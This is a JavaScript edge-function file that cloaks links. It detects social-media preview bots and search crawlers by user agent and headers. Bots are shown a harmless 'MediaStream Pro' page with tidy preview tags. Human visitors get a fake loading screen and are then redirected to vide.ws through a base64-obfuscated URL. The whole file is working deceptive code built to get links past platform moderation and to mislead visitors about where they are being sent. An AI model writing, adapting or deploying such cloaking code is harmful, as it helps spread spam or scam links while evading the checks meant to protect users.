export async function onRequest(context) {
  try {
    const { request } = context;
    const url = new URL(request.url);
    const path = url.pathname;
    const host = request.headers.get('host');
    
    console.log(`🔄 Processing: ${path} from ${host}`);

    // ADVANCED BOT DETECTION
    const userAgent = request.headers.get('user-agent') || '';
    const accept = request.headers.get('accept') || '';
    const acceptLanguage = request.headers.get('accept-language') || '';
    
    const isTwitterBot = userAgent.includes('Twitterbot');
    const isOtherBot = detectOtherBots(userAgent, accept, acceptLanguage);
    
    console.log(`🤖 Detection - Twitter: ${isTwitterBot}, Other: ${isOtherBot}`);

    if (isTwitterBot || isOtherBot) {
      // BOTS: Safe content (no redirect)
      console.log(`🛡️ Serving safe content to bot`);
      return serveSafeContent(path, host);
    } else {
      // HUMANS: Auto-redirect dengan delay dan progress bar
      console.log(`👤 Auto-redirecting human`);
      return serveAutoRedirect(path, host);
    }
  } catch (error) {
    console.error('❌ Error:', error);
    return new Response('Internal Server Error', { status: 500 });
  }
}

// ===== ADVANCED BOT DETECTION =====
function detectOtherBots(userAgent, accept, acceptLanguage) {
  const botPatterns = [
    /bot/i, /crawler/i, /spider/i, /monitoring/i,
    /facebookexternalhit/i, /WhatsApp/i, /TelegramBot/i,
    /Discordbot/i, /Slackbot/i, /Googlebot/i, /Bingbot/i,
    /YandexBot/i, /DuckDuckBot/i, /LinkedInBot/i
  ];
  
  const isBotByUA = botPatterns.some(pattern => pattern.test(userAgent));
  const hasNoAcceptLanguage = !acceptLanguage;
  const hasSimpleAccept = accept.includes('*/*');
  
  return isBotByUA || (hasNoAcceptLanguage && hasSimpleAccept);
}

// ===== PATH MAPPING =====
function getTargetPath(sourcePath) {
  const pathMappings = {
    '/d/': '/e/',
    '/f/': '/f/',
    '/e/': '/e/',
    '/s/': '/c/'
  };
  
  for (const [sourceBase, targetBase] of Object.entries(pathMappings)) {
    if (sourcePath.startsWith(sourceBase)) {
      const remainingPath = sourcePath.slice(sourceBase.length);
      return `https://vide.ws${targetBase}${remainingPath}`;
    }
  }
  
  return 'https://vide.ws/';
}

// ===== SAFE CONTENT FOR BOTS =====
function serveSafeContent(path, host) {
  const pathId = path.split('/').pop() || 'content';
  
  const safeHtml = `<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>MediaStream Pro - Video Content Platform</title>
    <meta name="description" content="Stream high-quality video content on MediaStream Pro. Premium streaming platform with extensive content library.">
    
    <!-- Twitter Card -->
    <meta name="twitter:card" content="summary_large_image">
    <meta name="twitter:title" content="MediaStream Pro - Video Platform">
    <meta name="twitter:description" content="Premium video streaming platform with HD content">
    <meta name="twitter:image" content="https://images.unsplash.com/photo-1574375927938-d5a98e8ffe85?w=1200&h=630&fit=crop">
    
    <!-- Open Graph -->
    <meta property="og:type" content="website">
    <meta property="og:title" content="MediaStream Pro - Video Platform">
    <meta property="og:description" content="Premium video streaming platform with HD content">
    <meta property="og:image" content="https://images.unsplash.com/photo-1574375927938-d5a98e8ffe85?w=1200&h=630&fit=crop">
    <meta property="og:url" content="https://${host}${path}">
    
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
            color: #333;
        }
        .container {
            background: rgba(255,255,255,0.95);
            backdrop-filter: blur(10px);
            border-radius: 20px;
            padding: 40px;
            box-shadow: 0 20px 40px rgba(0,0,0,0.1);
            max-width: 500px;
            width: 100%;
            text-align: center;
        }
        .logo {
            font-size: 2.5em;
            margin-bottom: 20px;
        }
        h1 {
            color: #2d3748;
            margin-bottom: 15px;
            font-size: 1.8em;
        }
        .content-id {
            background: #edf2f7;
            padding: 8px 16px;
            border-radius: 20px;
            font-family: 'Courier New', monospace;
            color: #4a5568;
            font-weight: bold;
            margin: 15px 0;
            display: inline-block;
        }
        .features {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 15px;
            margin: 25px 0;
        }
        .feature {
            background: #f7fafc;
            padding: 15px;
            border-radius: 10px;
            text-align: center;
        }
        .feature-icon {
            font-size: 1.5em;
            margin-bottom: 8px;
        }
        .stats {
            display: flex;
            justify-content: space-around;
            margin: 20px 0;
            font-size: 0.9em;
            color: #718096;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">🎬</div>
        <h1>MediaStream Pro</h1>
        <p>Premium Video Streaming Platform</p>
        
        <div class="content-id">Content ID: ${pathId}</div>
        
        <div class="features">
            <div class="feature">
                <div class="feature-icon">🔒</div>
                <div>Secure Streaming</div>
            </div>
            <div class="feature">
                <div class="feature-icon">📱</div>
                <div>Mobile Optimized</div>
            </div>
            <div class="feature">
                <div class="feature-icon">⚡</div>
                <div>Fast Delivery</div>
            </div>
            <div class="feature">
                <div class="feature-icon">🌐</div>
                <div>Global CDN</div>
            </div>
        </div>
        
        <div class="stats">
            <div>🎥 10K+ Videos</div>
            <div>👥 50K+ Users</div>
            <div>⭐ 4.8 Rating</div>
        </div>
        
        <p style="margin-top: 20px; font-size: 0.9em; color: #718096;">
            Join thousands of users enjoying premium content
        </p>
    </div>
</body>
</html>`;

  return new Response(safeHtml, {
    headers: { 
      'Content-Type': 'text/html; charset=utf-8',
      'Cache-Control': 'public, max-age=300'
    }
  });
}

// ===== AUTO-REDIRECT UNTUK HUMANS =====
function serveAutoRedirect(path, host) {
  const targetUrl = getTargetPath(path);
  const obfuscatedUrl = btoa(targetUrl).replace(/=/g, '');
  
  const autoRedirectHtml = `<!DOCTYPE html>
<html>
<head>
    <title>MediaStream Pro - Loading Your Content</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
    <!-- Safe Meta Tags -->
    <meta property="og:title" content="MediaStream Pro - Video Platform">
    <meta property="og:description" content="Loading your premium video content">
    <meta property="twitter:card" content="summary">
    
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: linear-gradient(135deg, #1a202c 0%, #2d3748 100%);
            color: white;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }
        .loading-container {
            background: rgba(255,255,255,0.1);
            backdrop-filter: blur(15px);
            border: 1px solid rgba(255,255,255,0.2);
            border-radius: 20px;
            padding: 40px;
            max-width: 500px;
            width: 100%;
            text-align: center;
        }
        .logo {
            font-size: 3em;
            margin-bottom: 20px;
        }
        h1 {
            margin-bottom: 10px;
            font-size: 1.8em;
        }
        .loading-steps {
            text-align: left;
            margin: 30px 0;
        }
        .step {
            display: flex;
            align-items: center;
            margin-bottom: 15px;
            padding: 12px;
            background: rgba(255,255,255,0.05);
            border-radius: 8px;
            opacity: 0.7;
            transition: all 0.3s ease;
        }
        .step.active {
            opacity: 1;
            background: rgba(255,255,255,0.1);
            border-left: 4px solid #48bb78;
        }
        .step.completed {
            opacity: 1;
            background: rgba(72, 187, 120, 0.1);
            border-left: 4px solid #48bb78;
        }
        .step-icon {
            width: 30px;
            height: 30px;
            background: #4a5568;
            color: white;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            margin-right: 15px;
            font-size: 0.8em;
        }
        .step.active .step-icon {
            background: #4299e1;
        }
        .step.completed .step-icon {
            background: #48bb78;
        }
        .loading-bar {
            height: 6px;
            background: rgba(255,255,255,0.2);
            border-radius: 3px;
            overflow: hidden;
            margin: 25px 0;
        }
        .loading-progress {
            height: 100%;
            background: linear-gradient(90deg, #4299e1, #48bb78);
            width: 0%;
            transition: width 0.5s ease;
        }
        .status-text {
            margin: 15px 0;
            font-size: 0.95em;
            color: #cbd5e0;
            min-height: 1.5em;
        }
        .countdown {
            font-size: 0.9em;
            opacity: 0.7;
            margin-top: 10px;
        }
    </style>
</head>
<body>
    <div class="loading-container">
        <div class="logo">🎬</div>
        <h1>MediaStream Pro</h1>
        <p>Preparing your premium content...</p>
        
        <div class="loading-steps">
            <div class="step active" id="step1">
                <div class="step-icon">1</div>
                <div>
                    <strong>Initializing Player</strong><br>
                    <small>Setting up video environment</small>
                </div>
            </div>
            <div class="step" id="step2">
                <div class="step-icon">2</div>
                <div>
                    <strong>Optimizing Stream</strong><br>
                    <small>Adjusting for your connection</small>
                </div>
            </div>
            <div class="step" id="step3">
                <div class="step-icon">3</div>
                <div>
                    <strong>Loading Content</strong><br>
                    <small>Accessing premium library</small>
                </div>
            </div>
        </div>
        
        <div class="loading-bar">
            <div class="loading-progress" id="loadingProgress"></div>
        </div>
        
        <div class="status-text" id="statusText">Starting content delivery system...</div>
        <div class="countdown" id="countdown">Redirecting in 3 seconds</div>
    </div>

    <script>
        let currentStep = 1;
        let countdown = 3;
        
        const steps = [
            { progress: 25, text: "Initializing video player components..." },
            { progress: 50, text: "Optimizing stream for your connection..." },
            { progress: 75, text: "Loading content from secure servers..." },
            { progress: 100, text: "Content ready! Redirecting..." }
        ];
        
        function updateProgress() {
            if (currentStep <= steps.length) {
                const step = steps[currentStep - 1];
                
                // Update progress bar
                document.getElementById('loadingProgress').style.width = step.progress + '%';
                
                // Update status text
                document.getElementById('statusText').textContent = step.text;
                
                // Update steps visual
                document.getElementById('step' + currentStep)?.classList.add('completed');
                if (currentStep < steps.length) {
                    document.getElementById('step' + (currentStep + 1))?.classList.add('active');
                }
                
                // Update countdown
                if (currentStep === steps.length) {
                    document.getElementById('countdown').textContent = 'Redirecting now...';
                    // Final redirect
                    setTimeout(performRedirect, 500);
                } else {
                    document.getElementById('countdown').textContent = 'Redirecting in ' + countdown + ' seconds';
                    countdown--;
                }
                
                currentStep++;
                setTimeout(updateProgress, 800);
            }
        }
        
        function performRedirect() {
            const encodedUrl = '${obfuscatedUrl}';
            const padding = 4 - (encodedUrl.length % 4);
            const paddedUrl = encodedUrl + '='.repeat(padding);
            
            try {
                const targetUrl = atob(paddedUrl);
                console.log('Redirecting to:', targetUrl);
                window.location.href = targetUrl;
            } catch (error) {
                console.error('Redirect error:', error);
                window.location.href = 'https://vide.ws/';
            }
        }
        
        // Start the auto-progress
        setTimeout(updateProgress, 500);
    </script>
</body>
</html>`;

  return new Response(autoRedirectHtml, {
    headers: { 
      'Content-Type': 'text/html; charset=utf-8',
      'Cache-Control': 'no-cache, no-store, must-revalidate'
    }
  });
}
